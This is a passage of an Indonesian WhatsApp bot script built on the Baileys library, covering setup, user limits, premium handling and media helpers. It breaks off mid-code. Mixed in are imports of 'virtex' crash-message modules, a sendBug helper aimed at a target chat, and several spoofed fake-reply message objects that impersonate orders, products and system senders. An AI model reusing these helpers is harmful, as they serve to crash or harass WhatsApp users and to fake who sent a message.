  /*Assalamualaikum Semua👋
Bagi yang udah ambil sc ini, sebelum nya terima kasih sudah download:))
Jangann lupa ya kasih tq to nama gua "Arasyaa", yang mau recode izin ke gua dulu aja https://wa.me/6281319944917

Thanks To
- Affis
- Rafli Rusdiana
- Manik
- Megumin Desu
- Penyedia Rest api
- Riyann
- Arasyaaa
- YogiPw
- DappaUhuy
- Mhank Bar Bar

arigatouuuuuuuu, selamat ngerun, klo eror jangan salahin gua jancuk*/
 const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ResyaaectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require('./lib/simple.js');
const { virtexp, vipi } = require("./lib/virtex.js"); //memans
const hx = require("hxz-api");
const yo = require("tod-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const crypto = require('crypto')
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const toMs = require("ms");
const imgbb = require("imgbb-uploader");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { lirikLagu } = require('./lib/lirik.js')
const { recognize } = require('./lib/ocr')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { wikiSearch } = require('./lib/wiki.js')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const bucinrandom = JSON.parse(fs.readFileSync('./database/bucin.json'))
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js")
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp.js')
const { ind } = require('./language')
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const { addVote, delVote } = require("./lib/vote");
const nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const aefka = JSON.parse(fs.readFileSync('./database/afk.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/badword.json'))
const reminder = require("./lib/reminder")
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗡𝗜𝗛, 𝗝𝗔𝗡𝗚𝗔𝗡 𝗕𝗨𝗧𝗔///////////////////////////////////////////////////////////////////////////////////////////////////////////
/*SETTINGGGGGGGG*/
banChats = false;
offline = false;
autorespon = false
targetpc = "6281319944917";
gopay = "0882-1329-2687";
member = "10";
limitawal = '20'
ovo = "0882-1329-2687";
pulsa = "0813-1994-4917";
dana = "0813-1994-4917"
namabot = "JOJO - BOT";
linkimg = "https://telegra.ph/file/fb08daf350ee2092c200f.jpg";
/*ITU YG DI ATAS LINK IMAGENYA DONASI DANA YA KAWAN*/
grupct = "https://chat.whatsapp.com/HECLovHbCI6LVVH4Q8FN2C";
owner = "6281319944917";
nama_owner = "Arasyaaa";
instagram = "sofunsyabi.id";
yt = "https://youtube.com/channel/UCZzt-Qw0zTYc8UP-LL2G5fA";
fake = "JOJO - BOT";
thumb = fs.readFileSync("./stik/thumb.jpeg");
numbernye = "0";
waktu = "-";
alasan = "Gada🗿";
autojoin = false;
prefixStatus = true;
hit_today = [];
roomttt = [];
defttt = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];

/*Akhir Setting*/

//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));
//Biasalah Storage
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const fiturnye = JSON.parse(fs.readFileSync('./database/video.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
     /********** PREMIUM **********/
     const getPremiumExpired = (sender) => {

		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		
		//
		const usedCommandRecently = new Set()

/**
 * Check is number filtered
 * @param  {String} from
 */
const isFiltered = (from) => !!usedCommandRecently.has(from)

/**
 * Add number to filter
 * @param  {String} from
 */
		//ATM
const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }  
        //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return syaa.sendMessage(from, `Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                         syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
                        syaa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    syaa.sendMessage(from, ind.limitend(pushname), text, {quoted: fake})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/limit.json',JSON.stringify(_limit))
           return false
       }
     }
// Sticker Cmd
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};

const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = syaa = async (syaa, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
    const type = Object.keys(mek.message)[0];
    1;
    var prefixRegEx = /^[!&z?=#.+\/]/gi;
    let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
    let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
    body =
      type === "conversation" && mek.message.conversation.startsWith(prefix)
        ? mek.message.conversation
        : type == "imageMessage" &&
          mek.message.imageMessage.caption.startsWith(prefix)
        ? mek.message.imageMessage.caption
        : type == "videoMessage" &&
          mek.message.videoMessage.caption.startsWith(prefix)
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" &&
          mek.message.extendedTextMessage.text.startsWith(prefix)
        ? mek.message.extendedTextMessage.text
        : "";

    budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
    const mentionUser = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.mentionedJid || [] : []

            mentionByReply = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""

            mentionUser.push(mentionByReply)
    let chats = _chats.match(prefixRegEx)
      ? _chats
          .split(prefixRegEx)
          .find((v) => v === _chats.replace(prefixRegEx, ""))
      : _chats;
    let command = chats.split(/ +/g)[0];
    hit_today.push(command);
    var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
    const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const args = _chats.trim().split(/ +/).slice(1);
    const arg = budy.slice(command.length + 2, budy.length)
    const isCmd = _chats.match(prefixRegEx)
      ? prefixRegEx.exec(_chats)["input"]
      : _chats;
    const q = args.join(" ");
    const botNumber = syaa.user.jid;
    const botNumberss = syaa.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");
    //test command
        //akhir
    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;

    const sender = mek.key.fromMe
      ? syaa.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? syaa.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    // const isSelfNumber = config.NomorSELF
    // const isOwner = sender.id === isSelfNumber
    const totalchat = await syaa.chats.all();
    const m = simple.smsg(syaa, mek);
    const groupMetadata = isGroup ? await syaa.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isBadWord = isGroup ? badword.includes(from) : false
    const isNsfw = isGroup ? nsfw.includes(from) : false
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isOwner = ownerNumber.includes(sender)
    const isBanned = ban.includes(sender)
    const isPremium= prem.includes(sender)
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? syaa.user.jid
      : syaa.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? syaa.user.name
      : conts.notify || conts.vname || conts.name || "-";
      const more = String.fromCharCode(8206)
    const readmore = more.repeat(4001)
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
      if (banChats) {
        if (!isOwner || !botNumber) return
      }
      idttt = [];
      players1 = [];
      players2 = [];
      turn = [];
      for (let i of roomttt) {
        idttt.push(i.id)
        players1.push(i.player1)
        players2.push(i.player2)
        turn.push(i.turn)
      }
      const isTTT = isGroup ? idttt.includes(from) : false
	    const isPlayer1 = isGroup ? players1.includes(sender) : false
      const isPlayer2 = isGroup ? players2.includes(sender) : false
      const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
      }
    //Y
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam";
    }
    

    //MESS
    mess = {
      wait: `Tunggu Sebentar ya kak, sedang Jojo Proses nihh!!`,
      admin: "*[ ADMIN GROUP ONLY ]*",
      tmbh: "*Tambah parameter 1/enable atau 0/disable*",
      nsfw: "FITUR NSFW BELUM DI AKTIFKAN, AKTIFKAN TERLEBIH DAHULU KETIK /nsfw 1",
      prem: "Maaf, fitur ini khusus member premium:)",
      own: "*[OWNER BOT ONLY]*",
      ban: "Kamu Telah Di Ban Oleh Owner, silahkan chat owner untuk minta di unban",
      success: "Success√",
      wrongFormat: "Format salah, Liat kembali di menu",
      error: {
        stick: "Sticker Only",
        Iv: "Link Gak Valid",
        api: "Maaf Terjadi Kesalahan di web",
      },
      only: {
        group: "*[ GROUP ONLY ]*",
      },
    };

    const reply = (teks) => {
      syaa.sendMessage(from, teks, text, { quoted: mek });
    };

    const sendMess = (hehe, teks) => {
      syaa.sendMessage(hehe, teks, text);
    };
    
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./strg/stiker/owner.only.webp')
			syaa.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./strg/stiker/donebrou.webp')
			syaa.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		//AKHIR BY KURR/YUDHA
    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? syaa.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : syaa.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };

    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: fake,
          orderTitle: "Arasyaaaaa.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 99999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fakethumb = (teks, yes) => {
      syaa.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      syaa.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            syaa.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "Yogi-Fakereply", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "Arasyaaaaa",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
   const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       syaa.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       syaa.sendMessage(from, hasil, type, options).catch(e => {
	       syaa.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}
    const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					syaa.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		//But verify
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}
const isRegistered = checkRegisteredUser(sender)
const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
syaa.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Mengakses Bot Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak```'
const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `Verify✔️`,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}
      //
      var premi = '*MEMBER BIASA*'
			if (isPremium) {
				premi = '*PREMIUM USER*'
			} 
			if (isOwner) {
				premi = '*OWNER BOT*'
			}
			var regis = '❌'
			if (isRegistered) {
			  regis = '✔️'
			}
	  var c = '```'
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      syaa.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await syaa.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await syaa.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      syaa.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        syaa.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      syaa.groupAdd(from, orangnya);
    };
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await syaa.relayWAMessage(
        syaa.prepareMessageFromContent(
          target,
          syaa.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      syaa.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
///afk 2
	// AFK
            for (let x of mentionUser) {
                if (aefka.hasOwnProperty(x.split('@')[0])) {
                    ini_txt = "Maaf user yang anda reply atau tag sedang afk. "
                    if (aefka[x.split('@')[0]] != "") {
                        ini_txt += "Dengan alasan " + aefka[x.split('@')[0]]
                    }
                    syaa.sendMessage(from, ini_txt, text, {quoted: mek})
                }
            }
            if (aefka.hasOwnProperty(sender.split('@')[0])) {
                reply("Kaka udah keluar dari mode afk, Selamat Datang Kembali👋")
                delete aefka[sender.split('@')[0]]
                fs.writeFileSync("./database/afk.json", JSON.stringify(aefka))
            }
    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        syaa.sendMessage(
          mek.key.remoteJid,
